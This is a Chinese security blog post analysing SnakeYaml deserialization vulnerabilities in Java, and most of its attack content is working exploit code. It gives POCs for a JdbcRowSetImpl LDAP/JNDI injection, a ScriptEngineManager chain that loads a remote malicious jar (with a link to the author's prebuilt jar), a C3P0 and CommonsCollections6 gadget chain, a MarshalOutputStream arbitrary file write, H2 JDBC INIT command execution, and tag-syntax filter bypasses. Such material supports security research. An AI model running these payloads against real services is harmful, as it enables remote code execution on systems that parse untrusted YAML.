---
title: "SnakeYaml反序列化分析"
onlyTitle: true
date: 2024-10-28 11:43:23
categories:
- java
- 框架漏洞
tags:
- SnakeYaml
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8115.png
---



SnakeYaml是java的yaml解析类库，支持Java对象的序列化/反序列化

类似python，SnakeYaml使用缩进代表层级关系，缩进只能用空格，不能用TAB。

Copy一手Yaml语法：

1、对象

使用冒号代表，格式为key: value。冒号后面要加一个空格：

```
key: value
```

可以使用缩进表示层级关系：

```
key: 
    child-key: value
    child-key2: value2
```

2、数组

使用一个短横线加一个空格代表一个数组项：

```
hobby:
    - Java
    - LOL
```

3、常量

YAML中提供了多种常量结构，包括：整数，浮点数，字符串，NULL，日期，布尔，时间。下面使用一个例子来快速了解常量的基本使用：

```
boolean: 
    - TRUE  #true,True都可以
    - FALSE  #false，False都可以
float:
    - 3.14
    - 6.8523015e+5  #可以使用科学计数法
int:
    - 123
    - 0b1010_0111_0100_1010_1110    #二进制表示
null:
    nodeName: 'node'
    parent: ~  #使用~表示null
string:
    - 哈哈
    - 'Hello world'  #可以使用双引号或者单引号包裹特殊字符
    - newline
      newline2    #字符串可以拆成多行，每一行会被转化成一个空格
date:
    - 2022-07-28    #日期必须使用ISO 8601格式，即yyyy-MM-dd
datetime: 
    -  2022-07-28T15:02:31+08:00    #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区
```

`-`的作用：

![image-20250417161408050](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161408050.png)

![image-20250417161422499](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161422499.png)

![image-20250417161428690](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161428690.png)

# SnakeYaml反序列化

1.x全版本可利用，snakeYaml<2.0

```xml
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.27</version>
</dependency>
```

SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。

- Yaml.load()：入参是一个字符串或者一个文件，经过反序列化之后返回一个Java对象；
- Yaml.dump()：将一个对象转化为yaml文件形式；

其中序列化出来的对象格式为`!!Snake.类名`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20220802103026-11a270ac-120b-1.png)

在反序列化时可以用`!!`指定反序列化的类名，跟fastjson一样

且是调用setter赋值，fastjson能用的JdbcRowSetImpl肯定能用



## JdbcRowSetImpl

注意SnakeYaml不能互转false和0，所以payload填false bool

POC：

```java
    public static void main(String[] args) throws Exception {
        String str = "!!com.sun.rowset.JdbcRowSetImpl\n" +
                "{\n"+
                "dataSourceName: ldap://192.168.80.1:8085/Evil,\n" +
                "autoCommit: false\n"+
                "}";
        Yaml yaml = new Yaml();
        yaml.load(str);
    }
```



## ScriptEngineManager

这个链利用了SPI机制

### SPI 机制

`Java SPI`（Service Provider Interface）是Java官方提供的一种`服务发现机制`，它允许在`运行时动态地加载实现`特定接口的类，而不需要在代码中显式地指定该类

当使用 `ServiceLoader.load(Class<T> service) `方法加载服务时，会检查 `META-INF/services` 目录下是否存在以接口全限定名命名的文件。如果存在，则读取文件内容，获取实现该接口的类的全限定名，并通过 `Class.forName()` 方法加载对应的类。

而且当我们调用 `ServiceLoader.load(Class<T> service)` 方法时，并不会立即将所有实现了该接口的类都加载进来，而是返回一个`懒加载迭代器`。

**只有在使用迭代器遍历时，才会按需加载对应的类并创建其实例。**

我们从源码分析下

### SPI源码分析

锁定到`ServiceLoader.load(Class<T> service)`，调用了另一个参数的load

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150437749.png)

然后调用ServiceLoader构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150534513.png)

构造函数调用reload

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150551381.png)

reload生成了一个LazyIterator

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150602218.png)

跟进到这个LazyIterator内部类，很明显我们在使用这个迭代器的时候，会先调用hashNext->hasNextService；再调用next，进而调用到nextService

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151104157.png)

在它的hasNextService获取了类路径为"META-IN/services/"+类名，并getResource，注意这里获取到的是configs的路径。后面的parse是解析这个configs

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153246135.png)

parse按行解析configs文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153346166.png)

在ServiceLoader.LazyInterator的nextService内完成了Class.forName初始化和newInstance实例化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151007315.png)

如果load的参数可以是http URL，是不是意味着ServiceLoader.load能加载远程META-INF/services下的恶意类？

### SPI使用

先看看SPI怎么用的：

* 定义接口：首先需要定义一个接口，所有实现该接口的类都将被注册为服务提供者。

* 创建实现类：创建一个或多个实现接口的类，这些类将作为服务提供者。

* 配置文件：在 META-INF/services 目录下创建一个以接口全限定名命名的文件（也就是我们前面分析的configs），文件内容为实现该接口的类的全限定名，每个类名占一行。

* 加载使用服务：使用 java.util.ServiceLoader 类的静态方法 load(Class service) 加载服务，默认情况下会加载 classpath 中所有符合条件的提供者。调用 ServiceLoader 实例的 iterator() 方法获取迭代器，遍历迭代器即可获取所有实现了该接口的类的实例。

所以我们本地需要在META-INF/services创建一个文件（用于configs加载），文件内容是我们需要加载的类的全限定名

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153838191.png)

然后恶意类实现ScriptEngineFactroy接口，并在构造函数 or 静态代码块写恶意代码。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153932389.png)

为什么是ScriptEngineFactory接口？

根据前面的内容，我们不难推断漏洞触发为ServiceLoader.load生成迭代器，调用迭代器时完成任意类加载

我们看下ScriptEngineFactory完成SPI的代码：

ScriptEngineFactory.initEngines先调用getServiceLoader，然后获取了迭代器，并在循环中使用了迭代器（hasNext->next）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154445075.png)

其中getServiceLoader就是ServiceLoader.load

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154554020.png)

这里load传入的service时ScriptEngineFactory，所以我们的恶意类需要实现ScriptEngineFactory接口

### POC

META-INF目录结构，放configs。恶意类放在源代码目录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023164923527.png)

为了一个URL同时对外部提供这两个文件用于加载，需要打包成jar，我打包好了发布在了my github：

https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/third/SnakeYaml/EvilServiceScriptEngineFactory_jdk8.jar

POC：

```java
public class ScriptEngineManger {
    public static void main(String[] args) {
        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8888/EvilServiceScriptEngineFactory_jdk8.jar\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}
```

注意需要jdk版本相同



### 其他使用SPI的场景

一些其他使用SPI的场景，简单看看

| 应用名称           | 具体应用场景                                                 |
| ------------------ | ------------------------------------------------------------ |
| 数据库驱动程序加载 | `JDBC`为了实现`可插拔`的数据库驱动，在Java.sql.Driver接口中定义了一组标准的API规范，而具体的数据库厂商则需要实现这个接口，以提供自己的数据库驱动程序。在Java中，JDBC驱动程序的加载就是通过SPI机制实现的。 |
| 日志框架的实现     | 流行的`开源日志框架`，如`Log4j、SLF4J和Logback`等，都采用了SPI机制。用户可以根据自己的需求选择合适的日志实现，而不需要修改代码。 |
| Spring框架         | `Spring框架`中的Bean加载机制就使用了SPI思想，通过读取classpath下的META-INF/spring.factories文件来`加载各种自定义的Bean`。 |
| Dubbo框架          | `Dubbo框架`也使用了SPI思想，通过接口`注解@SPI`声明扩展点接口，并在classpath下的META-INF/dubbo目录中提供实现类的配置文件，来实现扩展点的动态加载。 |
| MyBatis框架        | `MyBatis框架`中的插件机制也使用了SPI思想，通过在classpath下的META-INF/services目录中存放插件接口的实现类路径，来实现`插件的加载和执行`。 |
| Netty框架          | `Netty框架`也使用了SPI机制，让用户可以根据自己的需求选择合适的`网络协议实现方式`。 |
| Hadoop框架         | `Hadoop框架`中的输入输出格式也使用了SPI思想，通过在classpath下的META-INF/services目录中存放输入输出格式接口的实现类路径，来实现`输入输出格式的灵活配置和切换`。 |



## 不出网C3P0

不出网的情况能打C3P0，需要C3P0依赖

利用的是C3P0ImplUtils.parseUserridesAsString加载字节码，之前在分析C3P0+jackson联合打不出网时分析过了，移步：

https://godownio.github.io/2024/10/26/c3p0-lian/#SerializableUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E7%A0%81

换成Yaml.load触发setter（setUserOverridesAsString）

SnakeYaml 打C3P0 CC6 POC：

```java
public class C3P0ImplUtils_HEX_CC6 {
    public static String GenerateCC6() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        map.remove("test1");
        Class lazymapClass = lazyMap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, chainedTransformer);
        serialize(hashMap);
        return binaryFileToHexString(new File("cc6.ser"));
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static String binaryFileToHexString(File file) throws IOException {
        StringBuilder hexString = new StringBuilder();
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                for (int i = 0; i < bytesRead; i++) {
                    hexString.append(String.format("%02X", buffer[i]));
                }
            }
        }
        return hexString.toString();
    }
    public static void main(String[] args) throws Exception {
        String payload = "HexAsciiSerializedMap1"+GenerateCC6()+"1";
        String poc = aposToQuotes("!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n" +
                "{\n" +
                "'userOverridesAsString':'"+payload+"'\n" +
                "}");
        System.out.printf(poc);
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

}
```



## 不出网MarshalOutputStream写文件

snakeYaml和fastjson很像，可以借鉴一下fastjson的payload

phith0n师傅做了一张图，copy一下

![image-20250415182117465](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415182117465.png)

不出网的情况下，fastjson有一条1.2.68+commons-io写文件的链子。在分析这条链子的时候提到OpenJDK>=11能无需commons-io依赖直接写文件的MarshalOutputStream POC

https://godownio.github.io/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/

之所以在fastjson中MarshalOutputStream写文件的链子会比较局限

fastjson在找不到默认无参构造函数的情况下，会遍历所有构造函数，使用lookupParametersName寻找带参数名信息的构造函数

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163356883.png)](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163356883.png)

[![img](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png)](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png)

缺失了LocalVeriableTable并不会影响类的正常使用和反射调用，但是会使调试出现问题，无法提供方法中局部变量的名称、类型和作用范围等信息。

ASMUtils.lookupParametersName 方法依赖于 LocalVariableTable 信息来查找方法参数的名称。

https://zhuanlan.zhihu.com/p/263503452

> `LocalVariableTable` 是 Java 字节码中 **调试信息的一部分**，存在于 `.class` 文件中的方法结构内，属于 `Code` 属性的扩展部分。它记录了方法中每个局部变量的 **变量名、作用域、生存期及槽位索引**，但它 **不是必须的**——它仅在编译时启用了调试信息（例如 `javac -g`）时才会生成。

fastjson在调用构造函数时，缺失LocalVariableTable会导致ASMUtils.lookupParametersName报错

目前只发现 CentOS 下的 OpenJDK 8 字节码调试信息中含有 LocalVariableTable。或者是win下的OpenJDK >=11，所以在fastjson中利用环境非常有限

但是snakeYaml调用构造函数并不会用到LocalVariableTable，所以MarshalOutputStream写文件的链子会比较通用，没有jdk限制

fastjson写文件链子：

```json
{
    '@type':"java.lang.AutoCloseable",
    '@type':'sun.rmi.server.MarshalOutputStream',
    'out':
    {
        '@type':'java.util.zip.InflaterOutputStream',
        'out':
        {
           '@type':'java.io.FileOutputStream',
           'file':'dst',
           'append':false
        },
        'infl':
        {
            'input':'你的内容的base64编码'
        },
        'bufLen':1048576
    },
    'protocolVersion':1
}
```

改写为yaml格式：

```yaml
!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File ["Destpath"],false],!!java.util.zip.Inflater  { input: !!binary base64str },1048576]]
```

Destpath是目的路径，base64str为经过zlib压缩过后的文件内容

一个现成的payload：

```java
package org.exploit.third.SnakeYaml;

//模仿fastjson 1.2.68写文件
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.util.Base64;
import java.util.zip.Deflater;


public class SnakeYamlOffInternet {
    public static void main(String [] args) throws Exception {
        String poc = createPoC("ser.bin","ser2.bin");//源文件和写文件的绝对路径
        Yaml yaml = new Yaml();
        yaml.load(poc);

    }


    public static String createPoC(String SrcPath,String Destpath) throws Exception {
        File file = new File(SrcPath);
        Long FileLength = file.length();
        byte[] FileContent = new byte[FileLength.intValue()];
        try{
            FileInputStream in = new FileInputStream(file);
            in.read(FileContent);
            in.close();
        }
        catch (FileNotFoundException e){
            e.printStackTrace();
        }
        byte[] compressbytes = compress(FileContent);
        String base64str = Base64.getEncoder().encodeToString(compressbytes);
        String poc = "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\""+Destpath+"\"],false],!!java.util.zip.Inflater  { input: !!binary "+base64str+" },1048576]]";
        System.out.println(poc);
        return poc;
    }

    public static byte[] compress(byte[] data) {
        byte[] output = new byte[0];

        Deflater compresser = new Deflater();

        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        return output;
    }
}
```

这个方式进行写文件有个非常好的好处。就是因为zlib压缩的存在，可以写任何形式的文件，包括普通的文本文件和二进制文件。

### 联动ScriptEngineManager

联动ScriptEngineManger POC达到写文件后加载jar的姿势。完成不出网的RCE

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["file:///success.jar"]]]]
```

另外，SnakeYaml可以无限制调用构造函数，那么可以用ClassPathXmlApplicationContext进行spEL注入，当然，这种手法也需要连接外网，如果无法连接外网，也需要通过写文件再读取的方式进行利用

## 不出网H2 JDBC

update at 2025.4.15 phith0n大师傅对HertzBeat中SnakeYaml反序列化不出网的拓展。详情请直接移步https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html

jdk>=11，有h2database的情况下，能打h2 JDBC Attack

fastjson>=1.2.36可以通过$ref调用getter，如果目标有h2database的依赖，可以通过调用org.h2.jdbcx.JdbcDataSource#getConnection打h2database的jdbc attack

![image-20250417122145100](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417122145100.png)

```json
[
    {
        "@type": "java.lang.Class",
        "val": "org.h2.jdbcx.JdbcDataSource"
    },
    {
        "@type": "org.h2.jdbcx.JdbcDataSource",
        "url": "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS 'void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"calc\")\\; }'\\;CALL EXEC ()\\;"
    },
    {
        "$ref": "$[1].connection"
    }
]
```

>一般来说代码里的h2 jdbc attack是用`DriverManager.getConnection(JDBC_Url, username, password);`触发的，但是有参，不符合getter的调用

又因为org.h2.jdbcx.JdbcDataSource#getConnection实际上是调用的JdbcConnection构造函数，在snakeYaml中就很有用武之地了，snakeYaml打h2 jdbc：

```yaml
!!org.h2.jdbc.JdbcConnection [ "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"calc.exe\")\\; }$$\\;CALL EXEC ()\\;", {}, "a", "b", false ]
```

上述转为yaml格式应该是：

```yaml
!!org.h2.jdbc.JdbcConnection
- jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"calc.exe\")\\; }$$\\;CALL EXEC ()\\;
- {}
- a
- b
- false
```

而且H2 Database Web Console的未授权访问漏洞导致的JDBC注入 CVE-2022-23221的修复方式之一就是：在H2>=1.4.198中把构造函数的最后一个参数改为true（此处略过调试）

https://github.com/vulhub/vulhub/blob/master/h2database/h2-console-unacc/README.zh-cn.md

因为我们能直接控制构造函数的所有参数，所以能忽略h2执行命令所需的条件：必须知道数据库名或开启-ifNotExists

另外，我们观察到，第一个参数URL中，由于要在INIT中执行多个SQL语句，所以我使用了反斜线对分号进行转义`\;`，但又由于整个URL位于YAML中的字符串中，所以还要再次对反斜线进行转义`\\;`，整个POC的可读性大大降低。

> 网上有一些文章说JDBC的INIT中不支持执行多个SQL语句，其实原因就是没有转义分号导致的，实际上这里并没有限制。

其实JdbcConnection构造函数的第二个参数是Properties，我们完全可以将INIT这种属性放到这里面。

![image-20250417155614271](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417155614271.png)

以减少URL参数中的转义，然后将YAML修改成我们更熟悉的样式：

>YAML 中的 `|` 是一种 **多行文本（Literal Block Scalar）标记符**，用于保留换行并原样呈现多行字符串的内容

```yaml
!!org.h2.jdbc.JdbcConnection
- jdbc:h2:mem:test
- MODE: MSSQLServer
  INIT: |
    drop alias if exists exec;
    CREATE ALIAS EXEC AS $$void exec() throws Exception {Runtime.getRuntime().exec("calc.exe");}$$;
    CALL EXEC ();
- a
- b
- false
```

![1c4c466d-6be0-433f-b059-d5ee65bd4c09.5e0d5f5f0728](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/1c4c466d-6be0-433f-b059-d5ee65bd4c09.5e0d5f5f0728.png)

注意`-`的作用噢



## 绕过

`!!`可以用TAG来绕过

Tag的声明位于org.yaml.snakeyaml.nodes.Tags

### `!!`换为`tag:yaml.org,2002:`

`!!`实际上就是一个Tag，等同于`"tag:yaml.org,2002:"`加一个后缀。除了这里声明的类，Tag就是`"tag:yaml.org,2002:"`+类的全限定名，比如`!!javax.script.ScriptEngineManager`的Tag是`tag:yaml.org,2002:javax.script.ScriptEngineManager`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028112037343.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028113132038.png)

除此之外还有两种替换方式

### `!<tag>`

`!!javax.script.ScriptEngineManager`换为`!<tag:yaml.org,2002:javax.script.ScriptEngineManager>`

```java
!<tag:yaml.org,2002:javax.script.ScriptEngineManager> " +
                "[!<tag:yaml.org,2002:java.net.URLClassLoader> [[!<tag:yaml.org,2002:java.net.URL>" +
                " [\"http://b1ue.cn/\"]]]]
```

### `%TAG`

用%TAG声明一个 TAG，后面使用`!`就可以自动加上Tag

```java
%TAG !      tag:yaml.org,2002:
---
!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL ["http://b1ue.cn/"]]]]
```





ref：

https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html
